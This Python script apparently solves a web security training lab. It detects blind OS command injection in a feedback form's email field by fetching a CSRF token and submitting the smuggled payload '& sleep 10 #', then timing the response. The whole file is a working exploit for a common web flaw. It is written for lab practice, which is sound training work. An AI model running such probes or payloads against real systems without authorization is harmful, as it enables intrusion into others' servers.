#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from datetime import timedelta
from timeit import default_timer as timer
import argparse  # cli interface
import logging
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


__appName__ = 'OS Command Injection LAB#2'
__version__ = '1.0.0-alpha'
__appVers__ = '%s v%s' % (__appName__, __version__)
__usage__ = ('Perform OS Command Injection in Web Academy LAB #2')


def get_csrf_token(s, url):
    feedback_path = '/feedback'
    r = s.get(url + feedback_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find(attrs={'name': 'csrf'})['value']
    logging.info(f'Found CSRF token: {csrf}')
    return csrf


def check_command_injection(s, url, payload):
    submit_feedback_path = '/feedback/submit'
    command_injection = 'test@test.com ' + payload
    logging.info('Fetching CSRF Token')
    csrf_token = get_csrf_token(s, url)
    data = {'csrf': csrf_token, 'name': 'test', 'email': command_injection, 'subject': 'test', 'message': 'test'}
    logging.info(f'Injecting command: {data}')
    res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
    if (res.elapsed.total_seconds() >= 10):
        print('(+) Email field vulnerable to time-based command injection!')
    else:
        print('(-) Email field not vulnerable to time-based command injection!')


def main():
    # START CLI UI
    parser = argparse.ArgumentParser(description=__usage__)
    parser.add_argument('-v', '--version', action='version', version=__appVers__)
    parser.add_argument('-u', type=str, help='Target URL', required=True, metavar='URL')
    # parser.add_argument('-p', type=str, help='Payload', required=False, metavar='Payload')
    parser.add_argument('-d', '--debug', help='enable logging debug', default=False, action="store_true")
    args = parser.parse_args()
    # END CLI UI
    # Logging to STDOUT
    logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
    if not args.debug:
        logging.disable(logging.DEBUG)
    logging.info('Session Started')

    url = args.u
    payload = '& sleep 10 #'

    # if not args.p:
    #     payload = '& sleep 10 #'
    # else:
    #     payload = args.p

    logging.info(f'Payload: {payload}')
    # Create a session to the target URL
    s = requests.Session()
    check_command_injection(s, url, payload)

    logging.info('Session Finished')
    end_time = timer()
    logging.info(f'Duration: {(timedelta(seconds=end_time-start_time))}')


if __name__ == '__main__':
    start_time = timer()
    main()
